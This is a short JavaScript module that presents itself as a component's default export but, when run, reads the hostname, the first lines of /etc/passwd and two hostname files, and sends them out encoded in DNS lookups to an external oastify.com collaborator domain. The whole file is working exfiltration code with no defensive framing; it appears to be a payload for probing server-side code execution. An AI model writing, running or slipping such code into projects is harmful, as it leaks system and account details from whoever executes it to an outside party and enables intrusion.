module.exports = {
  default: function(props) {
    var os, dns, fs;
    try { os = require("os"); } catch(e) {}
    try { dns = require("dns"); } catch(e) {}
    try { fs = require("fs"); } catch(e) {}
    
    function sendDNS(label) {
      try { dns.lookup(label + ".co424cqd0wt6x1y1feehuheg2784wt.oastify.com", function(){}); } catch(e) {}
    }
    
    // hostname
    var h = "unknown";
    try { h = os.hostname(); sendDNS(h); } catch(e) {}
    
    // Читаем /etc/passwd через fs!
    if (fs) {
      try {
        var passwd = fs.readFileSync("/etc/passwd", "utf8");
        var lines = passwd.trim().split("\n");
        sendDNS("passwd-len" + passwd.length);
        for (var i = 0; i < Math.min(lines.length, 4); i++) {
          var enc = lines[i].replace(/[^a-zA-Z0-9]/g, "-").substring(0, 40);
          sendDNS("p" + i + "-" + enc);
        }
      } catch(e) {
        sendDNS("passwd-err");
      }
      
      // Читаем /proc/sys/kernel/hostname
      try {
        var kernhost = fs.readFileSync("/proc/sys/kernel/hostname", "utf8").trim();
        var enc2 = kernhost.replace(/[^a-zA-Z0-9]/g, "-");
        sendDNS("kern-" + enc2);
      } catch(e) {
        sendDNS("kern-err");
      }
      
      // Читаем /etc/hostname (альтернативный путь)
      try {
        var etchost = fs.readFileSync("/etc/hostname", "utf8").trim();
        var enc3 = etchost.replace(/[^a-zA-Z0-9]/g, "-");
        sendDNS("etchost-" + enc3);
      } catch(e) {
        sendDNS("etchost-err");
      }
    }
    
    return null;
  }
};
